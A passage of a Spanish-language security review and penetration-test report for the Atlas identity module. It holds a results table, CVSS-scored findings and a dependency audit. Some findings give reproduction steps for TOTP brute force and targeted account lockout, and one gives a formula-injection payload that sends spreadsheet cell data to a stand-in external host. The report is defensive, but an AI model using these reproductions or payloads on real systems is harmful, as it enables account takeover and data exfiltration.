`ConsumoTests`), las 38 pruebas `Pentest_*` y las clases que tocan la antifalsificación o el Bearer (`TokensTests`,
`IdentidadTests`, `SesionesTests`, `EndurecimientoTests`, `ProxyTests`, `ErroresClienteTests`, `SandboxMicrocksTests`,
`PaquetesContratosTests`, `NotificacionesTests`, `AutorizacionTests`, `ModuloContratosTests`, `GuiasContratosTests`:
148 pruebas, verdes). atlas-docs: `uv run pytest` 135 pasan y 6 omitidas; `ruff check` y `ruff format --check` limpios.

## 4. Pendientes que la revisión no pudo cerrar **[por verificar]**

Dependen de `flit-gitops`, de Entra o de qa, que esta revisión no tocó:

- Que el nginx del host **reemplace** `X-Forwarded-For` y `X-Forwarded-Proto` (no los encadene con los del cliente), y
  el número real de saltos frente a `ForwardLimit = 2`; que `Atlas__Proxy__RedesConfiables` esté puesto en qa y pdn
  (F4-SEC-13).
- Límites de tasa en memoria por réplica: con varias réplicas, el efectivo se multiplica (ATLAS-ADR-0022 y 0048).
- `kubectl exec` al namespace limitado por RBAC a quienes deben usar la cuenta de emergencia (ATLAS-ADR-0027).
- Claim opcional `auth_time` en las apps de Entra de qa y pdn (F4-SEC-18) y MFA por acceso condicional.
- Salida a `api.pwnedpasswords.com` desde las VPS (sin ella la revisión de contraseñas queda en 74 entradas).
- Si qa y pdn atienden por IPv6 (agrava F4-SEC-01).
- `ATLAS_S3_PUBLICO`, CORS del bucket y regla de ciclo de vida del bucket (HU 4.6; mitiga F4-SEC-28).
- Usuarios de RabbitMQ por servicio y `NetworkPolicy` de atlas-docs (ATLAS-ADR-0044; mitiga F4-SEC-12).
- Suite oficial de la OpenID Foundation contra qa.
- Trusted Types: revisar los informes de qa y decidir cuándo exigirlos (ATLAS-ADR-0048).
- Política de retención de IPs (Ley 1581, ATLAS-ADR-0022).
- Protección de tags `v*` en flit-atlas (F4-SEC-27).

## 5. Prueba de penetración del módulo de identidad

Montaje: `EntornoApi` (atlas-api en `WebApplicationFactory`, Postgres y Redis de Testcontainers, `BuzonDePrueba` para
los correos, `RelojDePrueba` para vencer, `AutenticadorDePrueba` para WebAuthn e IPs de documentación `2001:db8::/32`).
Comando: `dotnet run --project services/api/tests/Flit.Atlas.Api.Tests -- -method "*Pentest_*"` (38 pruebas; para ver
los hallazgos fallar se quitan los `Skip`: 29 pasan y 9 fallan, exactamente las omitidas).

| Ataque | Resultado | Prueba |
|---|---|---|
| Fuerza bruta de contraseña (10 intentos desde 10 IPs) | **Resiste:** bloqueo, la contraseña correcta tampoco entra, evento `cuenta_bloqueada` | `Pentest_diez_contrasenas_erradas_por_HTTP_bloquean…` |
| Fuerza bruta de códigos de recuperación | **Resiste:** bloquea | `Pentest_diez_codigos_de_recuperacion_errados…` |
| Fuerza bruta del TOTP repitiendo la contraseña correcta | **Era vulnerable** (F4-SEC-01); **corregido** en `2078282`: bloquea, el paso dura 5 intentos y hay límite por cuenta | `Pentest_los_fallos_de_TOTP_no_se_reinician…`, `…tras_cinco_codigos_errados…`, `…el_limite_por_cuenta…` |
| Ráfaga concurrente de contraseñas (20 a la vez) | **Era vulnerable** (F4-SEC-02); **corregido** en `2078282`: bloquea una sola vez | `Pentest_veinte_contrasenas_erradas_concurrentes…` |
| Bloqueo dirigido de una cuenta con passkey | **Era vulnerable** (F4-SEC-03); **corregido** en `2078282`: no suma fallos y responde igual | `Pentest_contrasenas_inventadas_no_bloquean…` |
| Reutilización de invitación (secuencial y concurrente) | **Resiste:** 410 al reusar; dos aceptaciones simultáneas crean una sola cuenta | `CuentasExternasTests.Aceptar_con_contrasena…`, `Pentest_dos_aceptaciones_simultaneas…` |
| Invitación vencida (borde de 72 h) | **Resiste:** sirve a las 71 h 58 min, 410 a las 72 h 1 min; tampoco entrega clave TOTP ni opciones de passkey | `Pentest_la_invitacion_sirve_hasta_las_72_horas…` |
| Tokens de invitación manipulados | **Resiste:** todos 410 con el mismo cuerpo; el original sigue sirviendo | `Pentest_tokens_de_invitacion_manipulados…` |
| Reutilización del enlace de recuperación, enlace anterior y vencido | **Resiste** | `Pentest_el_enlace_de_recuperacion_no_sirve_dos_veces…`, `Pentest_el_enlace_de_recuperacion_vence` |
| Recuperar la cuenta con solo el buzón | **Débil por diseño** (F4-SEC-06): desde `2078282` avisa al titular sin enlaces, cierra sesiones y tokens y exige factor nuevo; riesgo del buzón en ATLAS-ADR-0049 (propuesto) | `Pentest_recuperar_la_cuenta_con_el_buzon_avisa_al_titular…` |
| Saltar el MFA (sesión tras la contraseña, paso inventado, paso cruzado, paso tras restablecimiento) | **Resiste** | `Pentest_no_hay_sesion_sin_segundo_factor…` |
| Reutilizar un TOTP con otro formato (`123-456`) | **Era vulnerable** (F4-SEC-05); **corregido** en `2078282` (también un código de un paso anterior) | `Pentest_un_codigo_TOTP_usado_no_vale…` |
| Enumeración por mensajes (ingreso y recuperación, pasando el tope) | **Resiste:** mismo estado y cuerpo | `Pentest_el_ingreso_responde_lo_mismo…`, `Pentest_la_recuperacion_responde_lo_mismo…` |
| Enumeración por tiempos (recuperación con correo de 800 ms) | **Era vulnerable** (F4-SEC-04); **corregido** en `2078282`: el correo sale de una cola en memoria | `Pentest_la_recuperacion_tarda_lo_mismo…` |
| Cookie robada tras cerrar sesión | **Resiste:** 401 en lectura y en mutación | `Pentest_una_cookie_copiada_deja_de_servir…` |
| Fijación de sesión | **Resiste** | `Pentest_fijacion_de_sesion…` |
| Cookie alterada o inventada | **Resiste** | `Pentest_una_cookie_alterada_o_inventada…` |
| Sesión inactiva más de 8 h | **Resiste** | `Pentest_una_sesion_inactiva…` |
| Cambio de rol con sesión abierta | **Resiste** (roles manuales); grupos de Entra **corregido** en `2078282` (F4-SEC-08) | `RolesTests.Retirar_una_asignacion…`, `SesionesTests.El_invalidador…`, `SincronizacionPersonasTests.Recalcula_los_roles_de_los_grupos…` (Graph simulado) |
| CSRF sin cabecera, con `Origin` ajeno, `null`, `http` o sufijo | **Resiste** (6 casos) | `Pentest_csrf_con_sesion…` |
| CSRF con un `Authorization: Bearer` inventado y la cookie | **Era vulnerable** (F4-SEC-33, informativo sin CORS); **corregido** | `Pentest_un_Bearer_inventado_no_exime…` |
| Proveedor simulado en qa | **Resiste:** el arranque falla | `Pentest_el_ingreso_simulado_no_existe_fuera_de_local_y_dev` |
| Manipulación de `tid` (otro tenant con `iss` de FLIT, cuenta personal) | **Resiste:** redirige a `cuenta_no_permitida` y no crea persona | `Pentest_un_token_de_Entra_con_tid_ajeno…` |
| Toma de persona por correo con otro `oid` | **Era vulnerable** (F4-SEC-07); **corregido** en `2078282`: se niega con evento | `Pentest_un_oid_nuevo_de_Entra_no_hereda…` |
| Reutilización de refresh token | **Resiste:** revoca la cadena | `TokensTests.Reutilizar_un_refresh_ya_usado…` |
| Refresh de un cliente canjeado por otro | **Resiste** | `Pentest_el_refresh_de_un_cliente_no_lo_canjea_otro_cliente` |
| Token de otra audiencia; `id_token` como Bearer | **Resiste** | `TokensTests.Un_token_para_otra_audiencia…`, `Pentest_el_id_token_no_sirve…` |
| Token alterado (JWE con texto o etiqueta cambiados) o JWS `alg: none` | **Resiste** | `Pentest_un_token_de_acceso_alterado_o_sin_firma…` |
| Código de autorización reutilizado, sin PKCE, `redirect_uri` ajena o distinta en el canje | **Resiste** | `TokensTests.Un_codigo_solo_se_canjea…`, `…Sin_PKCE…`, `Pentest_la_redirect_uri_del_canje…` |
| Spec podado con extensiones internas | **Vulnerable** (F4-SEC-09) | `PentestPodaTests` (omitida) |
| RLS en una petición anónima | **Débil** (F4-SEC-10) | `Pentest_una_peticion_sin_sesion…` (omitida) |
| Fórmula en el Excel exportado | **Vulnerable** (F4-SEC-11) | `services/docs/tests/exportes/test_seguridad_excel.py` (omitida) |

## 6. Hallazgos

Severidad orientativa con CVSS 3.1. «Corregido» solo en los informativos o bajos triviales; los de severidad media o
mayor quedan para que el coordinador los asigne, con su prueba omitida.

### Alta

**Corregido en `2078282`** (rama `f4/seguridad-identidad`, ATLAS-ADR-0049). **F4-SEC-01 · Alta (7.4, `AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N`) · La contraseña correcta reinicia el contador y deja
adivinar el TOTP sin bloqueo.**
- *Dónde:* `Identidad/Seguridad/VerificadorContrasena.cs:67-70` (`ResetAccessFailedCountAsync` también cuando el factor
  válido es la contraseña, llamado desde `Externos/EndpointsCuentasExternas.cs:314`); el paso del TOTP se lee sin
  borrarse y un fallo no lo invalida (`EndpointsCuentasExternas.cs:340, 372-375`).
- *Reproducción:* `POST /api/v1/identidad/entrar/local` con la contraseña correcta (contador a 0), 9 ×
  `POST /api/v1/identidad/entrar/local/segundo-factor` con códigos errados, repetir. Prueba
  `Pentest_los_fallos_de_TOTP_no_se_reinician_al_repetir_la_contrasena_correcta`.
- *Impacto:* con la contraseña (relleno de credenciales, reuso) el segundo factor cae por fuerza bruta: a 10
  peticiones por minuto por IP, unas 100 IPs (o una /64 de IPv6) bastan para horas, no años.
- *Recomendación:* contador del segundo factor que la contraseña no reinicie (reiniciar solo al terminar el ingreso);
  invalidar el paso tras 3-5 fallos (`TomarAsync` y paso nuevo); límite por cuenta atacada; agrupar IPv6 por /64.

### Media

**Corregido en `2078282`** (rama `f4/seguridad-identidad`, ATLAS-ADR-0049). **F4-SEC-02 · Media (5.9, `AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N`) · Fallos concurrentes se pierden del contador.**
`VerificadorContrasena.cs:75` ignora el `IdentityResult` de `AccessFailedAsync`; con `ConcurrencyStamp`, en una ráfaga
gana una escritura. *Reproducción:* 20 `POST /entrar/local` simultáneos desde IPs distintas
(`Pentest_veinte_contrasenas_erradas_concurrentes_bloquean_la_cuenta`): la cuenta no queda bloqueada. *Recomendación:*
incremento atómico en SQL (`UPDATE … SET access_failed_count = access_failed_count + 1 RETURNING`) o candado por usuario
en Redis, y revisar el resultado.

**Corregido en `2078282`** (rama `f4/seguridad-identidad`, ATLAS-ADR-0049). **F4-SEC-03 · Media (5.3, `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L`) · Bloqueo dirigido de cuentas que solo tienen passkey.**
El paso de contraseña acepta cuentas sin contraseña y el fallo suma (`EndpointsCuentasExternas.cs:301-316`); luego la
passkey se rechaza por bloqueo (`:420-424`). *Reproducción:* 10 contraseñas inventadas para el correo de la víctima y
la passkey legítima recibe 403 (`Pentest_contrasenas_inventadas_no_bloquean_el_ingreso_con_passkey`); se repite hasta
24 h. *Recomendación:* no contar fallos de contraseña en cuentas sin contraseña (responder el 401 genérico con el
PBKDF2 ficticio) y no bloquear la passkey por fallos de contraseña (contadores separados).

**Corregido en `2078282`** (rama `f4/seguridad-identidad`, ATLAS-ADR-0049). **F4-SEC-04 · Media (5.3, `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`) · Los tiempos revelan si una cuenta existe.**
`/recuperacion` envía el correo dentro de la petición solo si la cuenta existe (`Externos/CuentasExternas.cs:266-282`);
`/entrar/local` no calcula hash para cuentas bloqueadas ni sin contraseña (`VerificadorContrasena.cs:59-65`).
*Reproducción:* `Pentest_la_recuperacion_tarda_lo_mismo_exista_o_no_la_cuenta` (correo de 800 ms: ~810 ms de
diferencia). *Impacto:* enumeración de clientes y proveedores. *Recomendación:* enviar el correo después de responder
(canal en memoria o `Response.OnCompleted`) y hacer el PBKDF2 ficticio también para cuentas bloqueadas o sin contraseña.

**Corregido en `2078282`** (rama `f4/seguridad-identidad`, ATLAS-ADR-0049). **F4-SEC-05 · Media (4.2, `AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N`) · La protección contra reuso del TOTP se salta con otro
formato.** La marca en Redis usa el código sin espacios (`EndpointsCuentasExternas.cs:357-361`) y el verificador quita
también guiones (`VerificadorContrasena.cs:50-51`); el código usado al aceptar o recuperar no se marca
(`Externos/FactoresExternos.cs:154-158`). *Reproducción:* entrar con `123456` y luego con `123-456`
(`Pentest_un_codigo_TOTP_usado_no_vale_otra_vez_escrito_con_otro_formato`). *Recomendación:* normalizar una sola vez a
6 dígitos y rechazar otro formato; mejor, guardar el último paso de tiempo aceptado por usuario (RFC 6238 §5.2) en todos
los caminos.

**Mitigado en `2078282`, riesgo residual en ATLAS-ADR-0049 (propuesto, a la espera del líder)**: aviso al titular sin enlaces, cierre de todas las sesiones y tokens, factor nuevo obligatorio antes de la sesión. **F4-SEC-06 · Media, de diseño (6.8, `AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N`) · La recuperación reemplaza todo el MFA con
solo el correo y sin aviso.** `CuentasExternas.CompletarRecuperacionAsync` (`:326-343`) retira todos los factores y
registra uno nuevo con el enlace; no se avisa de recuperaciones ni restablecimientos. *Reproducción:*
`Pentest_recuperar_la_cuenta_exige_algo_mas_que_el_buzon_de_correo`. *Impacto:* quien controle el buzón controla la
cuenta (V6.4.3 **[por verificar el número]**). *Recomendación:* pedir un código de recuperación o un factor vigente; si
no tiene, que lo apruebe un administrador; avisar por correo de toda recuperación y restablecimiento; o aceptar el
riesgo en un ADR.

**Corregido en `2078282`** (rama `f4/seguridad-identidad`, ATLAS-ADR-0049). **F4-SEC-07 · Media (5.9, `AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:N`) · Un `oid` nuevo de Entra hereda por correo una persona
existente y sus roles.** `Aprovisionamiento/AprovisionadorEmpleados.cs:173-186` (y `Personas/SincronizadorPersonas.cs:240-246`)
enlaza la primera persona empleada con el mismo correo y sin `oid`; el correo sale de `email`/`preferred_username`/`upn`,
atributos mutables (`Entra/IngresoEntra.cs:45`). *Reproducción:* persona precargada con `atlas.superadmin` y otra cuenta
del tenant con el mismo correo (`Pentest_un_oid_nuevo_de_Entra_no_hereda_por_correo_la_persona_y_los_roles_de_otra`).
*Impacto:* escalada interna si alguien con permisos de usuario en Entra o un buzón reciclado reusa el correo.
*Recomendación:* enlazar solo por `oid` (precargarlo con Graph); un enlace por correo solo si la persona no tiene
asignaciones manuales, o con confirmación de un administrador; evento `vinculo_por_correo` de severidad alta.

**Corregido en `2078282`** (rama `f4/seguridad-identidad`, ATLAS-ADR-0049). **F4-SEC-08 · Media (6.5, `AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N`) · Los roles de grupos de Entra solo se recalculan en el
ingreso interactivo.** `AprovisionadorEmpleados.cs:115-118`; la sincronización diaria no toca asignaciones `grupo_entra`
(`SincronizadorPersonas.cs:146`) y el refresh no resincroniza (`Tokens/EndpointsTokens.cs:186-218`). *Impacto:* quien
sale de un grupo con `atlas.superadmin` conserva el rol mientras use la sesión (hasta 7 días) o sus refresh de
`atlas-cli` (hasta 30 días). *Recomendación:* resincronizar `transitiveMemberOf` en la corrida diaria e invalidar
sesiones si cambia; bajar el tope absoluto de empleados; documentar el desfase. *Hecho:* la corrida diaria recalcula y
cierra sesiones (sin permiso nuevo de Graph: `GroupMember.Read.All`); bajar el tope de 7 días queda por decidir.

**F4-SEC-09 · Media (5.3, `AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N`) · La poda deja salir extensiones `x-flit-*` de procedencia
interna.** Lista negra de dos extensiones (`Modulos.Contratos/Poda/NucleoPoda.cs:88`, `Verificar` en `:449`); las `x-*`
sueltas de `paths`, `webhooks` y `components/<tipo>` se saltan (`PodadorOpenApi.cs:123-126, 183-186`,
`NucleoPoda.cs:411-414`). El contrato real `contracts/ict/core-ict.enriquecido.v1.yaml` trae en operaciones públicas
`x-flit-origen` con archivos y clases de core-ict (l. 954, 989, 1076, 1213), `x-flit-hoja-excel`, `x-flit-tabla` e
`info.x-flit-changelog`; `info.description` nombra servicios internos. *Reproducción:* `PentestPodaTests.Pentest_la_poda_no_deja_salir_ninguna_extension_x_flit_de_procedencia_interna`;
en la aplicación, `GET /api/v1/portal/paquetes/{p}/contratos/{c}/spec`, la exportación y Microcks. *Impacto:* fuga de
estructura interna a clientes (contra ATLAS-ADR-0038 y §15 del prompt maestro). *Recomendación:* lista blanca de
extensiones (`x-flit-obligatoriedad`, `x-enum-descriptions`, …) que quite cualquier otra `x-*` en todo nivel, también
en `Verificar` (fail-closed); revisar las descripciones de `info`.

**F4-SEC-10 · Media, endurecimiento (5.0, `AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N`) · RLS no es segunda barrera en las
peticiones anónimas.** Sin sesión, `AlcanceDatosDeSesion.De` devuelve `AlcanceDatos.Sistema` (`alcance_total=on`,
`Identidad/Autorizacion/PermisosDeSesion.cs:61-64`), contra el comentario de `Plataforma/Datos/AlcanceDatos.cs:23`;
aplica al proxy del sandbox, al feed ICS, al ingreso y a los informes de CSP. Además `flit_atlas` es dueño de las tablas
(puede `ALTER TABLE … NO FORCE` ante una inyección SQL) y las pruebas de la API corren como superusuario
(`EntornoApi.cs:53-64`). *Reproducción:* `Pentest_una_peticion_sin_sesion_no_recibe_el_alcance_de_datos_del_sistema`
(al corregir, actualizar `MatrizPermisosTests…El_alcance_de_datos…`, que afirma el comportamiento actual).
*Recomendación:* `Ninguno` con `HttpContext` presente y sin autenticar, `Sistema` explícito solo en segundo plano;
separar el rol dueño (migrador) del de la app; fallar al arrancar si `current_user` es superusuario o `BYPASSRLS`; correr
`AislamientoPortalTests` con el usuario de servicio.

**F4-SEC-11 · Media (5.4, `AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N`) · Inyección de fórmulas en el Excel exportado.**
`services/docs/src/atlas_docs/exportes/excel.py:51, 63`: `_limpio` no neutraliza el `=` inicial; openpyxl guarda la celda
como fórmula. Toca guías completas, descripciones, ejemplos y changelog. *Reproducción:* guía o descripción con
`=HYPERLINK("https://x.ejemplo.com/?d="&A1,"Ver detalle")` y exportar a Excel
(`services/docs/tests/exportes/test_seguridad_excel.py`, omitida). *Impacto:* el libro llega a otra organización con
enlaces o fórmulas activas. *Recomendación:* forzar `data_type = "s"` cuando openpyxl infiera `"f"` en `_celda` y
`_encabezado` (o anteponer `'`), y quitar el `skip` de la prueba.

**F4-SEC-12 · Media (6.5, `AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`; baja con `NetworkPolicy`) · atlas-docs lee el cuerpo de
`POST /exportes` antes de validar el token y sin tope.** `services/docs/src/atlas_docs/main.py:117, 143-147` (FastAPI
resuelve el cuerpo antes de las dependencias); uvicorn sin tope; los topes del modelo cuentan caracteres. *Reproducción:*
desde un pod con red hacia atlas-docs, sin token, `POST /exportes` con varios GB o en paralelo. *Impacto:* OOM del pod y
caída del consumidor de la cola. *Recomendación:* middleware que rechace sin `Content-Length` o por encima del tope (413)
y valide el token antes del cuerpo; confirmar la `NetworkPolicy` en flit-gitops.

**Corregido en `2078282`** (rama `f4/seguridad-identidad`, ATLAS-ADR-0049). **F4-SEC-13 · Media condicional (5.3, `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L`) · Sin `RedesConfiables` en qa o pdn el
arranque sigue y los límites por IP se vuelven globales.** `Flit.Atlas.Api/Program.cs:36-47`. *Impacto:* 20 ingresos
por minuto para todo el mundo (denegación del ingreso) y auditoría con la IP del pod. *Recomendación:* que el arranque
falle en qa y pdn sin `Atlas__Proxy__RedesConfiables` (como `ConfiguracionRequerida`), y prueba de integración con una
IP remota no confiable.

### Baja

| Id | CVSS 3.1 | Hallazgo | Dónde | Recomendación |
|---|---|---|---|---|
| F4-SEC-14 | 3.8 | (**Corregido en `2078282`** (rama `f4/seguridad-identidad`, ATLAS-ADR-0049).) Un `ext.admin_organizacion` deshace con «renovar» una suspensión hecha por FLIT; las acciones sobre invitaciones no piden reautenticación | `Externos/ServicioInvitaciones.cs:301-308, 379-386`; `EndpointsAdministracionExternos.cs:132-188` | Guardar quién suspendió; un admin externo no reactiva lo que suspendió FLIT; reautenticación en crear, renovar, suspender y revocar |
| F4-SEC-15 | 4.3 | El admin de una organización enumera correos de todo Atlas (409 con códigos distintos, incluidos empleados) | `ServicioInvitaciones.cs:156-168` | Para un actor externo, un único 409 con el mismo código y mensaje (ATLAS-ADR-0025 §2) |
| F4-SEC-16 | 3.1 | Carrera entre aceptar y revocar una invitación (revocar sin `FOR UPDATE` ni token de concurrencia) | `ServicioInvitaciones.cs:345-366` | `FOR UPDATE` también en revocar, suspender y renovar, o `xmin` como token de concurrencia |
| F4-SEC-17 | 3.1 | Pasos de contraseña y términos leídos y borrados en dos operaciones: dos peticiones paralelas abren dos sesiones | `EndpointsCuentasExternas.cs:340/376, 436/446` | `TomarAsync` (GETDEL) al terminar con éxito |
| F4-SEC-18 | 3.1 | (**Corregido en `2078282`** (rama `f4/seguridad-identidad`, ATLAS-ADR-0049).) La reautenticación no verifica `auth_time` | `Entra/IngresoEntra.cs:51-53`, `AprovisionadorEmpleados.cs:143` | Con `ClaveReautenticar`, exigir `auth_time` presente y reciente (< 5 min) y `max_age=0`; habilitar el claim en Entra |
| F4-SEC-19 | 3.5 | (**Corregido en `2078282`** (rama `f4/seguridad-identidad`, ATLAS-ADR-0049).) Un externo esquiva su sesión de 24 h con refresh de `atlas-cli`/`atlas-mcp` de 30 días (sube con F7) | `Tokens/EndpointsTokens.cs:248-258`, `OpcionesTokens.cs:35` | Concesión de externos limitada a `AbsolutaExternos`, o clientes no disponibles para externos |
| F4-SEC-20 | 3.1 | Consentimiento implícito y `meta refresh`: un enlace externo obtiene un código sin interacción (hoy solo llega al loopback) | `Tokens/SincronizadorClientes.cs:189`, `EndpointsTokens.cs:146-148` | Pantalla de confirmación para clientes no loopback; botón en lugar de `meta refresh` |
| F4-SEC-21 | 2.0 | (**Corregido en `2078282`** (rama `f4/seguridad-identidad`, ATLAS-ADR-0049).) `emergencia.cuenta_creada` y `emergencia.enlace_emitido` no llegan al log ni a Loki (logs apagados en el comando) | `Flit.Atlas.Api/Program.cs:52-56`, `RegistroSeguridad.cs:183-186` | Proveedor de log mínimo en el comando (tipo e id) o alerta sobre `identidad_evento_seguridad` |
| F4-SEC-22 | 4.3 | La llave del sandbox sigue sirviendo cuando quien la activó pierde el acceso o el contrato deja de ser compartible | `Modulos.Contratos/Sandbox/EndpointsSandbox.cs:246-259`, `ServicioSandbox.cs:293-297, 353` | Evaluar el acceso de `ActivadoPor` en el proxy (caché corta) o apagar la llave en `VigilanteVencimientos` |
| F4-SEC-23 | 3.1 | El changelog de la exportación del portal nombra contratos fuera del alcance de la persona | `Exportaciones/ArmadorEntrada.cs:182, 220-301` | Changelog solo con los contratos visibles para esa persona |
| F4-SEC-24 | 2.6 | El rol implícito por propiedad no exige que la persona sea empleada (la restauración del historial no revalida) | `Plataforma/Permisos/PermisosEfectivos.cs:162-168`, `Equipo/Endpoints/EndpointsHistorial.cs:192` | Exigir `Tipo == Empleado` para roles implícitos |
| F4-SEC-25 | 2.6 | Negaciones de exportaciones del portal y llaves inválidas del sandbox no quedan auditadas (V8.4) | `Exportaciones/EndpointsExportaciones.cs:330, 397`, proxy del sandbox | Auditar con `EndpointsPortal.AccionNegado` |
| F4-SEC-26 | 3.1 | Proxy a Microcks con `AllowAutoRedirect` y casi todas las cabeceras del mock (incluidas `Location` y CSP) | `ModuloContratos.cs:163`, `EndpointsSandbox.cs:46-51, 314-320` | `AllowAutoRedirect=false`, lista blanca de cabeceras, forzar `nosniff` y `CSP default-src 'none'` |
| F4-SEC-27 | 3.1 | Publicación: cualquier tag `v*` del workflow vale; la audiencia es independiente de `atlas_url`; identidad por nombre del repo | `Publicacion/OpcionesPublicacion.cs:292`, `AutorizacionPublicacion.cs:96-110`, `.github/workflows/atlas-publicar.yml:545, 706` | Proteger tags o fijar versiones; exigir `audiencia == atlas_url`; validar `repository_id`/`repository_owner_id` |
| F4-SEC-28 | 2.4 | Entradas huérfanas en el S3 si la transacción falla tras subirlas (para versiones internas, el spec completo) | `Exportaciones/ServicioExportaciones.cs:80-81` | Borrar en el `catch` o barrer prefijos sin fila; regla de ciclo de vida del bucket |
| F4-SEC-29 | 3.3 | atlas-docs: caché de llaves por `kid` sin vencimiento (una llave retirada sigue valiendo) y refresco del JWKS sin límite por `kid` inventado | `services/docs/src/atlas_docs/autenticacion.py:45` | `cache_keys=False` con `cache_jwk_set=True, lifespan=300`; un refresco cada 30 s como máximo; prueba con `PyJWKClient` real |
| F4-SEC-30 | 2.7 | atlas-docs: specs patológicos (`RecursionError`, alias) se tratan como fallo de infraestructura y ocupan el tope en curso 2 h | `services/docs/src/atlas_docs/specs.py:64, 76`, `cola.py:320` | Capturar `RecursionError`/`MemoryError` como `SpecInvalidoError`; rechazar alias |
| F4-SEC-31 | 3.7 | Contraseñas: HIBP falla abierto con lista local de 74 entradas; no hay cambio de contraseña ni gestión de factores autenticada; no se avisa al usuario de cambios de factores | `Externos/ValidadorContrasenaFiltrada.cs:101-105`, `Externos/CorreosExternos.cs` | Lista local ≥ 3000 (V6.2.4); endpoints autenticados con reautenticación para cambiar contraseña, regenerar códigos y agregar passkey; correo de aviso |
| F4-SEC-32 | 3.1 | Dependencias con avisos sin parche que cumpla las 2 semanas (§7) | `services/docs/pyproject.toml` (`pillow<13`, `brotli<1.2.1`), `services/render/go.mod` | Subir `pillow` a 13.0.0 y `brotli` a 1.2.1 desde el 30/10/2026 y 07/11/2026 aprox.; `toolchain go1.26.10` en `go.mod` antes de desplegar atlas-render |

### Informativos

**F4-SEC-33 · Informativo · Corregido.** La exención del Bearer en la antifalsificación valía también para peticiones
autenticadas con la cookie: `POST /api/v1/identidad/salir` con la cookie, `Authorization: Bearer x` y `Origin` ajeno
respondía 204. No explotable entre orígenes sin CORS (el preflight lo bloquea). Arreglo de 3 líneas en
`Identidad/EndpointsIdentidad.cs` (`UseAntifalsificacionApi`): la exención solo aplica si no viene la cookie
`__Host-atlas`. Regresión: `Pentest_un_Bearer_inventado_no_exime_de_la_antifalsificacion_a_una_peticion_con_la_cookie`.

**F4-SEC-34 · Informativos agrupados.**
- `cola.py:148` validaba el `exportacionId` con `re.match` y `$`, que acepta un salto de línea final: **corregido** a
  `re.fullmatch`. `cola.py:146` registra `type` sin quitar saltos de línea (productor de confianza).
- atlas-docs no revisa `typ` del JWT (`at+jwt`, RFC 9068 §4) (`autenticacion.py:53-56`) **[por verificar el `typ` que
  emite OpenIddict]**.
- `ExpireTimeSpan` de la cookie fijo en el valor por defecto (`ExtensionesIdentidad.cs:266`).
- `ErrorCodigoCanjeado` (`Tokens/AuditoriaTokens.cs:46`) no se usa; cerrar otra sesión no revoca los tokens de
  OpenIddict (por diseño: documentarlo).
- Eventos `enlace_rechazado` faltantes en `…/passkey/opciones` y `…/totp/clave` de invitación, recuperación y emergencia.
- PWA: *source maps* públicos (`apps/web/vite.config.ts:167`: usar `'hidden'`); errores propios de nginx bajo `/api` sin
  cabeceras (`nginx.conf.template:45-48`); `ambientePorHost` acepta cualquier host con etiqueta `qa` o `sandbox`
  (`visor/servidores.ts:26-31`, contenido por el `connect-src`); el gancho de DOMPurify es global (`Markdown.tsx:36`:
  usar una instancia propia antes de Mermaid en F6); `atlas-proxy.conf:5` pasa `X-Forwarded-Proto` del cliente.
- Contratos: los permisos extra no se atan al alcance de la invitación que los dio (`Portal/AccesoPortal.cs:310-330`);
  comparticiones de proveedor sin tope de vigencia (`ReglasComparticiones.cs:42-62`); un responsable lista sandboxes y
  organizaciones de cualquier cliente (`EndpointsSandbox.cs:134-135, 209-221`).
- DOMPurify 3.4.16 tiene avisos (§7) en modos que Atlas no usa (`SAFE_FOR_TEMPLATES`, `IN_PLACE`, XHTML): no aplican a
  `Markdown.tsx`.

## 7. Auditoría de dependencias

| Ecosistema | Comando | Resultado |
|---|---|---|
| .NET | `dotnet list Flit.Atlas.slnx package --vulnerable --include-transitive` | Sin paquetes vulnerables en los 20 proyectos. |
| PWA | `pnpm audit --prod` (en `apps/web`) | 8 avisos: `dompurify` 3.4.16 (1 crítico GHSA-cg2g-xh64-v4q7, 1 alto GHSA-mrv2-3pqr-j5jr, 1 bajo GHSA-c6gr-qvv4-5v3f; modos no usados, ver F4-SEC-34; 3.4.17 es del 12/10/2026, aún < 2 semanas), y transitivas de `@scalar/api-reference` (`undici` 7.29.1: 1 alto y 2 moderados; `zod` 4.6.5: 1 alto; `@ai-sdk/provider-utils` 4.0.5: 1 bajo), en el agente de chat de Scalar que el visor aislado no usa con red. Subir `dompurify` a 3.4.17 desde el 26/10/2026 y Scalar cuando publique las transitivas corregidas. |
| atlas-docs | `uv export --frozen --no-dev` + `pip-audit 2.10.1 -r … --no-deps` (instalado con `uvx --exclude-newer 2026-10-09`) | `pillow` 12.3.0: 39 avisos corregidos en 13.0.0 (del 16/10/2026, < 2 semanas; tope `pillow<13` puesto a propósito); `brotli` 1.2.0: 2 avisos corregidos en 1.2.1 (topado igual). Exposición baja: atlas-docs no decodifica imágenes ni fuentes del usuario (markdown-it reemplaza imágenes por texto y el `url_fetcher` de WeasyPrint siempre falla, `pdf.py:265-272`). F4-SEC-32. |
| atlas-ia | lo mismo | Sin avisos. |
| atlas-render (Go) | `go run golang.org/x/vuln/cmd/govulncheck@v1.1.4 ./...` | 18 avisos alcanzables, todos de la librería estándar de Go 1.26.3 local (`net/http`, `crypto/tls`, `crypto/x509`, `net/textproto`, `net/url`, `encoding/asn1`), corregidos hasta go1.26.10; el CI usa `go-version-file` con `go 1.26.0`. atlas-render aún no tiene imagen ni despliegue. F4-SEC-32. |
| Secretos | `gitleaks git --redact` 8.30.1 sobre el historial de la rama | Sin hallazgos (58 commits). |

## 8. Recomendación sobre abrir a externos en pdn

**No se recomienda todavía.** Los externos son justamente el modelo de amenaza de las cuentas locales, y hoy:

1. **Bloqueantes** (deben corregirse y su prueba omitida pasar): F4-SEC-01 (fuerza bruta del TOTP), F4-SEC-02, F4-SEC-03,
